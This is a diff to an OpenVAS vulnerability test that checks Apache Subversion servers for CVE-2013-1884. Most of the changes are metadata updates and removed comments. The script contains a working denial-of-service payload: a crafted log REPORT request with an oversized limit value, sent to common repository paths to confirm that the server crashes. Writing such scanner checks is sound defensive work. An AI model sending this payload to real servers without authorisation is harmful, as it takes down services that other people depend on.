@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_subversion_log_report_dos_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
+# $Id: gb_apache_subversion_log_report_dos_vuln.nasl 10873 2018-08-10 07:37:56Z cfischer $
 #
 # Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802054");
-  script_version("$Revision: 6698 $");
+  script_version("$Revision: 10873 $");
   script_bugtraq_id(58898);
   script_cve_id("CVE-2013-1884");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-10 09:37:56 +0200 (Fri, 10 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-06-06 15:08:09 +0530 (Thu, 06 Jun 2013)");
   script_name("Apache Subversion 'mod_dav_svn' log REPORT Request DoS Vulnerability");
   script_xref(name:"URL", value:"http://secunia.com/advisories/52966/");
@@ -46,12 +46,16 @@ if(description)
   script_mandatory_keys("Apache_SVN/banner");
 
   script_tag(name:"affected", value:"Apache Subversion 1.7.0 through 1.7.8");
+
   script_tag(name:"insight", value:"An error within the 'mod_dav_svn' module when handling crafted log 'REPORT'
   request with a limit outside the allowed range.");
+
   script_tag(name:"solution", value:"Upgrade to Apache Subversion version 1.7.9 or later,
   For updates refer to http://subversion.apache.org");
+
   script_tag(name:"summary", value:"The host is running Apache Subversion and is prone denial of
   service vulnerability.");
+
   script_tag(name:"impact", value:"Successful exploitation will let the remote attackers to cause a segfault
   by sending crafted log 'REPORT' request.
 
@@ -61,6 +65,7 @@ if(description)
   will be vulnerable to this without authentication.");
 
   script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
@@ -68,32 +73,15 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Variable Initialization
-h_port = 0;
-banner = "";
-req1 = "";
-res1 = "";
-comman_data = "";
-limit_inside = "";
-limit_outside = "";
-normal_req = "";
-normal_res = "";
-crafted_req = "";
-crafted_res = "";
-
-## Get HTTP Port
 h_port = get_http_port(default:80);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: h_port);
 if(!banner || banner !~ "Server: Apache.* SVN"){
   exit(0);
 }
 
-## Get host name
 host = http_host_name(port:h_port);
 
-## Confirm HTTP server is alive
 if(http_is_dead(port:h_port)) exit(0);
 
 comman_data = string('<?xml version="1.0" encoding="UTF-8"?>\n',
@@ -110,11 +98,9 @@ limit_outside = string(comman_data,
                        '<S:limit>123456789123456789123456789</S:limit>\n',
                        '</S:log-report>\n');
 
-## Iterate over possible svn repos
 foreach path (make_list_unique("/", "/repo/", "/repository/", "/trunk/", "/svn/", "/svn/trunk/",
                         "/repo/trunk/", "/repo/projects/", "/projects/", "/svn/repos/", cgi_dirs(port:h_port)))
 {
-  ## Get proper working path
   req1 = http_get(item:string(path), port:h_port);
   res1 = http_keepalive_send_recv(port:h_port, data:req1);
 
@@ -133,7 +119,6 @@ foreach path (make_list_unique("/", "/repo/", "/repository/", "/trunk/", "/svn/"
                                                  "\r\n\r\n", limit_inside);
   normal_res = http_keepalive_send_recv(port:h_port, data:normal_req);
 
-  ## Confirm proper SVN report response
   if((normal_res !~ "HTTP/1.. 200 OK" && "<S:log-report" >!< normal_res)){
     continue;
   }
@@ -154,7 +139,7 @@ foreach path (make_list_unique("/", "/repo/", "/repository/", "/trunk/", "/svn/"
   }
 
   ## some times response has "\r\n" hence check strlen(crafted_res) < 3
-  ## Trying 2 times to make sure the server is not responding
+  ## nb: Trying 2 times to make sure the server is not responding
   if(isnull(crafted_res) || strlen(crafted_res) < 3)
   {
     crafted_res = http_keepalive_send_recv(port:h_port, data:crafted_req);
